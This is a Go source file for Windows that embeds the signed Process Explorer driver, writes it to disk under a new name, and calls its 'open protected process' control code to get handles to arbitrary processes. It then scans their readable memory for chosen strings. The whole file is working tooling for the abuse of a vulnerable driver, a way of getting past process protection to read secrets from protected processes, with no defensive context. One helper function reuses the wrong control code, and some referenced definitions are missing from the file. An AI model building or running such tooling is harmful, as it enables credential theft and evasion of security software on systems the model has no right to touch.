package main

import (
	"bytes"
	_ "embed"
	"fmt"
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

//go:embed PROCEXP152.SYS
var DRIVER_BYTES []byte

const DIRVER_FILENAME = "ASTRAL.SYS"

var DRIVER_FULL_PATH, _ = windows.FullPath(DIRVER_FILENAME)

func GetProcExpDriver() (*windows.Handle, error) {
	name, _ := windows.UTF16PtrFromString("\\\\.\\PROCEXP152")
	hDriver, err := windows.CreateFile(name, windows.GENERIC_ALL, 0, nil, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, 0)
	if err != nil {
		return nil, CreateError(err)
	}
	return &hDriver, nil
}

func DriverOpenProcess(hDriver windows.Handle, pid int) (*windows.Handle, error) {
	var hProc windows.Handle
	hProcSize := uint32(unsafe.Sizeof(hProc))
	inputBuffLen := uint32(unsafe.Sizeof(pid))
	var bytesReturned uint32
	if err := windows.DeviceIoControl(hDriver, CONTROL_CODE_OPEN_PROTECTED_PROCESS, (*byte)(unsafe.Pointer(&pid)),
		inputBuffLen, (*byte)(unsafe.Pointer(&hProc)), hProcSize, &bytesReturned, nil); err != nil {
		return nil, CreateError(err)
	}
	return &hProc, nil
}

func WriteDriverOnDisk(driverFullPath string) error {
	return CreateError(os.WriteFile(driverFullPath, DRIVER_BYTES, 0644))
}

func ReadProcessMemory(hDriver windows.Handle, hProc windows.Handle, baseAddress uintptr, buffer []byte) (int, error) {
	var bytesRead uint32
	err := windows.DeviceIoControl(
		hDriver,
		CONTROL_CODE_OPEN_PROTECTED_PROCESS,
		(*byte)(unsafe.Pointer(&baseAddress)),
		uint32(unsafe.Sizeof(baseAddress)),
		&buffer[0],
		uint32(len(buffer)),
		&bytesRead,
		nil,
	)
	if err != nil {
		return 0, err
	}
	return int(bytesRead), nil
}

type MemoryBasicInformation struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
}

func SearchStringsInMemory(pid int, stringsToFind []string) {
	hDriver, err := GetProcExpDriver()
	if err != nil {
		fmt.Println("Error al obtener el driver:", err)
		return
	}
	defer windows.CloseHandle(*hDriver)

	hProc, err := DriverOpenProcess(*hDriver, int(pid))
	if err != nil {
		fmt.Printf("Error al abrir el proceso con PID %d: %v\n", pid, err)
		return
	}
	defer windows.CloseHandle(*hProc)

	searchBytes := make([][]byte, len(stringsToFind))
	for i, s := range stringsToFind {
		searchBytes[i] = []byte(s)
	}

	var address uintptr
	for {
		var mbi MemoryBasicInformation
		mbiSize := unsafe.Sizeof(mbi)
		ret, _, _ := syscall.Syscall6(
			procVirtualQueryEx.Addr(),
			5,
			uintptr(*hProc),
			address,
			uintptr(unsafe.Pointer(&mbi)),
			mbiSize,
			0,
			0,
		)

		if ret == 0 {
			break
		}

		if mbi.State == windows.MEM_COMMIT && mbi.Protect&(windows.PAGE_READONLY|windows.PAGE_READWRITE|windows.PAGE_EXECUTE_READ|windows.PAGE_EXECUTE_READWRITE) != 0 {
			buffer := make([]byte, mbi.RegionSize)
			var bytesRead uintptr
			windows.ReadProcessMemory(*hProc, mbi.BaseAddress, &buffer[0], mbi.RegionSize, &bytesRead)

			for i, s := range searchBytes {
				if idx := bytes.Index(buffer[:bytesRead], s); idx != -1 {
					foundAddress := mbi.BaseAddress + uintptr(idx)
					fmt.Printf("The string '%s' was found at the address 0%x\n", stringsToFind[i], foundAddress)
				}
			}
		}

		address = mbi.BaseAddress + mbi.RegionSize
	}
}

var (
	modKernel32        = windows.NewLazySystemDLL("kernel32.dll")
	procVirtualQueryEx = modKernel32.NewProc("VirtualQueryEx")
)
